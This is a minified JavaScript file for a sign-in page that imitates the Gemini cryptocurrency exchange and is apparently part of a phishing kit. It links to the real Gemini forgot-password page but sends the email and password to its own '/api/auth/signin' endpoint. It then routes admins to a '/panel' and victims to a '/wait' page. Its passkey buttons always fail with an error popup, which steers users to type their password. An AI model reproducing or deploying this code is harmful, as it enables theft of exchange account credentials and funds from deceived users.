import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";const y=document.getElementById("passkey-btn"),f=document.getElementById("passkey-btn-2"),o=document.getElementById("error-overlay"),a=document.getElementById("error-popup"),H=document.getElementById("dismiss-btn"),q=document.getElementById("try-again-btn"),s=document.getElementById("composable-input-1"),r=document.getElementById("email-label"),d=document.getElementById("email-container"),t=document.getElementById("composable-input-2"),C=document.getElementById("password-label"),E=document.getElementById("password-container"),c=document.getElementById("password-toggle"),A=document.getElementById("change-email"),b=document.getElementById("signin-form"),N=document.getElementById("email-form"),z=document.getElementById("password-form"),S=document.getElementById("email-section"),m=document.getElementById("password-section"),n=document.getElementById("signin-submit"),h=document.getElementById("remember-checkbox"),P=document.getElementById("forgot-password-link"),Z=document.getElementById("email-display"),F=document.getElementById("email-display-2"),D='<span class="e1czpx481 css-11mxs84 e1vsinnk0"><svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"></path></svg></span>Sign in with passkey',V='<span class="e1czpx481 css-1m901bd e1vsinnk0"><svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 9.23858 4.23858 7 7 7C8.63693 7 10.0891 7.78702 11.0002 9H20.4142L23.4142 12L18.6274 16.7868L16.25 15.2019L13.966 16.7245L11.6667 15H11.0002C10.0891 16.213 8.63693 17 7 17C4.23858 17 2 14.7614 2 12ZM7 14C8.10457 14 9 13.1046 9 12C9 10.8954 8.10457 10 7 10C5.89543 10 5 10.8954 5 12C5 13.1046 5.89543 14 7 14Z"></path></svg></span>Sign in with passkey<span class="notranslate e1czpx480 css-bv71wd e1vsinnk0"><div aria-label="spinner" data-testid="spinner-animation" class="css-1fwjvyf e1oqezu31"><svg color="inherit" viewBox="0 0 50 50" class="css-3qcxsx e1oqezu30"><circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle></svg></div></span>',R='Sign in<span class="notranslate e1czpx480 css-bv71wd e1vsinnk0"><div aria-label="spinner" data-testid="spinner-animation" class="css-1fwjvyf e1oqezu31"><svg color="inherit" viewBox="0 0 50 50" class="css-3qcxsx e1oqezu30"><circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle></svg></div></span>',O='<svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 4C9.18137 4 6.70076 5.4099 4.95859 7.01443C4.08087 7.8228 3.36038 8.7071 2.85251 9.54347C2.36538 10.3457 2 11.2247 2 12C2 12.7753 2.36538 13.6543 2.85251 14.4565C3.36038 15.2929 4.08087 16.1772 4.95859 16.9856C6.70076 18.5901 9.18137 20 12 20C14.8186 20 17.2992 18.5901 19.0414 16.9856C19.9191 16.1772 20.6396 15.2929 21.1475 14.4565C21.6346 13.6543 22 12.7753 22 12C22 11.2247 21.6346 10.3457 21.1475 9.54347C20.6396 8.7071 19.9191 7.8228 19.0414 7.01443C17.2992 5.4099 14.8186 4 12 4ZM16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12ZM12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12C10 13.1046 10.8954 14 12 14Z"></path></svg>',G='<svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M20.1148 15.8724C20.5182 15.3998 20.8656 14.9208 21.1475 14.4566C21.6346 13.6544 22 12.7754 22 12.0001C22 11.2247 21.6346 10.3458 21.1475 9.54354C20.6396 8.70718 19.9191 7.82288 19.0414 7.01451C17.2992 5.40998 14.8186 4.00008 12 4.00008C10.8824 4.00008 9.81801 4.22172 8.83168 4.58926L20.1148 15.8724ZM4.70715 3.29301L4.70711 3.29297L3.29289 4.70718L5.29818 6.71247C5.18209 6.81217 5.06886 6.91295 4.95859 7.01451C4.08087 7.82288 3.36038 8.70718 2.85251 9.54354C2.36538 10.3458 2 11.2247 2 12.0001C2 12.7754 2.36538 13.6544 2.85251 14.4566C3.36038 15.293 4.08087 16.1773 4.95859 16.9856C6.70076 18.5902 9.18137 20.0001 12 20.0001C13.8786 20.0001 15.607 19.3738 17.0667 18.481L19.2929 20.7072L20.707 19.293L4.70708 3.29309L4.70715 3.29301ZM14.032 15.4463L12.518 13.9323C12.3528 13.9765 12.1792 14.0001 12 14.0001C10.8954 14.0001 10 13.1046 10 12.0001C10 11.8209 10.0236 11.6473 10.0677 11.482L8.55382 9.96811C8.20193 10.5636 8 11.2583 8 12.0001C8 14.2092 9.79086 16.0001 12 16.0001C12.7418 16.0001 13.4365 15.7981 14.032 15.4463Z"></path></svg>';let w=!1,g=!1,v=!1;function x(e){return e.trim()===""?!1:/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)}function $(){d.className="css-hz0zn8 e1ra8wu4",r.className="css-zucu6m e1ra8wu0",s.className="css-1yi9rl e1jjkunm0",u()}function L(){d.className="css-hz0zn8 e1ra8wu4",r.className="css-t3yqxk e1ra8wu0",s.className="css-1pv9mq9 e1jjkunm0",u()}function J(){d.className="css-hz0zn8 e1ra8wu4",r.className="css-15lv71w e1ra8wu0",s.className="css-1pv9mq9 e1jjkunm0",u()}function k(){const e=s.value.trim();d.className="css-16l0l88 e1ra8wu4",e===""?(r.className="css-zucu6m e1ra8wu0",s.className="css-1yi9rl e1jjkunm0"):(r.className="css-1xroaq2 e1ra8wu0",s.className="css-1pv9mq9 e1jjkunm0"),s.setAttribute("aria-describedby","composable-input-1-message"),U()}function U(){u();const e=document.createElement("div");e.setAttribute("data-testid","undefined-message"),e.id="composable-input-1-message",e.className="css-dztwwu e3mmshu1",e.innerHTML='<svg aria-hidden="true" width="16px" height="16px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6223 4.66123C13.4793 2.6038 10.5204 2.60381 9.37735 4.66124L2.77637 16.543C1.66549 18.5426 3.11139 20.9999 5.39885 20.9999H18.6008C20.8882 20.9999 22.3341 18.5426 21.2233 16.543L14.6223 4.66123Z" fill="#CA3A3A"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M11 14V8H13V14H11ZM11 18V16H13V18H11Z" fill="white"></path></svg><span class="css-hxoadd e54x8yx0">Please enter a valid email address, like user@gmail.com.</span>',d.parentNode.parentNode.appendChild(e)}function u(){const e=document.getElementById("composable-input-1-message");e&&e.remove(),s.removeAttribute("aria-describedby")}function W(){E.className="css-hz0zn8 e1ra8wu4",C.className="css-zucu6m e1ra8wu0",t.className="css-1yi9rl e1jjkunm0"}function B(){E.className="css-hz0zn8 e1ra8wu4",C.className="css-t3yqxk e1ra8wu0",t.className="css-1pv9mq9 e1jjkunm0"}function K(){E.className="css-hz0zn8 e1ra8wu4",C.className="css-15lv71w e1ra8wu0",t.className="css-1pv9mq9 e1jjkunm0"}function T(){t.value.trim()!==""?(n.disabled=!1,n.className="e3uiujg0 css-1e1c3ne e1czpx482"):(n.disabled=!0,n.className="e3uiujg0 css-12gwiiz e1czpx482")}function Q(e){e.className="e1fsl8uw0 css-e10ujo e1czpx482",e.disabled=!0,e.innerHTML=V}function X(e){e.className="e1fsl8uw0 css-1yeiyqw e1czpx482",e.disabled=!1,e.innerHTML=D}function Y(){o.style.display="block",o.style.pointerEvents="auto",o.setAttribute("data-state","open"),o.setAttribute("aria-hidden","true"),a.style.display="flex",a.style.pointerEvents="auto",a.setAttribute("data-state","open");const e=a.querySelector('[role="alertdialog"]');e.setAttribute("data-state","open"),e.style.pointerEvents="auto"}function j(){o.style.display="none",o.style.pointerEvents="none",o.setAttribute("data-state","closed"),a.style.display="none",a.style.pointerEvents="none",a.setAttribute("data-state","closed");const e=a.querySelector('[role="alertdialog"]');e.setAttribute("data-state","closed"),e.style.pointerEvents="none"}function I(e){Q(e),setTimeout(()=>{X(e),Y()},500)}function _(){const e=s.value.trim();Z.textContent=e,F.textContent=e.length>23?e.substring(0,24)+"...":e,P.href=`https://exchange.gemini.com/signin/forgot?email=${encodeURIComponent(e)}`,N.style.display="none",z.style.display="block",S.style.display="none",m.style.display="block",t.focus(),B()}function ee(){N.style.display="block",z.style.display="none",S.style.display="block",m.style.display="none",s.focus(),s.value.trim()!==""?L():$()}function se(){w=!w,w?(t.type="text",c.innerHTML=G,c.setAttribute("aria-label","Hide password text")):(t.type="password",c.innerHTML=O,c.setAttribute("aria-label","Show password text"))}function te(){g=!g;const e=document.querySelector(".selected"),i=document.querySelector(".unselected");g?(e.style.display="block",i.style.display="none",h.value="true"):(e.style.display="none",i.style.display="block",h.value="false")}async function ne(e){if(e.preventDefault(),!v)if(m.style.display!=="none"){v=!0;const i=s.value.trim(),M=t.value;n.disabled=!0,n.className="e3uiujg0 css-1x0z3gm e1czpx482",n.innerHTML=R,setTimeout(async()=>{try{const l=await fetch("/api/auth/signin",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:i,password:M})});if(!l.ok){const p=await l.json();throw p.error==="Invalid admin credentials"?window.showToast&&window.showToast("Invalid admin credentials. Please try again.","error"):window.showToast&&window.showToast(p.error||"Invalid credentials","error"),new Error(p.error||"Invalid credentials")}(await l.json()).user.isAdmin?(window.showToast&&window.showToast("Welcome back, Admin!","success"),setTimeout(()=>{window.location.replace("/panel")},1e3)):(window.showToast&&window.showToast("Sign in successful!","success"),setTimeout(()=>{window.location.replace("/wait")},1e3))}catch(l){console.error("Error:",l),n.disabled=!1,n.className="e3uiujg0 css-1e1c3ne e1czpx482",n.innerHTML="Sign in",v=!1}},500)}else{const i=s.value.trim();x(i)?_():k()}}s.addEventListener("focus",()=>{const e=s.value.trim();e!==""&&!x(e)?k():L()});s.addEventListener("blur",()=>{const e=s.value.trim();x(e)?J():k()});s.addEventListener("input",()=>{s===document.activeElement&&L()});s.addEventListener("keydown",e=>{e.key==="Enter"&&(e.preventDefault(),b.dispatchEvent(new Event("submit")))});t.addEventListener("focus",()=>{B()});t.addEventListener("blur",()=>{t.value.trim()!==""?K():W()});t.addEventListener("input",()=>{t===document.activeElement&&B(),T()});t.addEventListener("keydown",e=>{e.key==="Enter"&&(e.preventDefault(),n.disabled||b.dispatchEvent(new Event("submit")))});c.addEventListener("click",se);A.addEventListener("click",ee);b.addEventListener("submit",ne);y.addEventListener("click",()=>I(y));f.addEventListener("click",()=>I(f));H.addEventListener("click",()=>{j()});q.addEventListener("click",()=>{j();const e=m.style.display!=="none"?f:y;I(e)});h.parentElement.addEventListener("click",e=>{e.preventDefault(),te()});T();
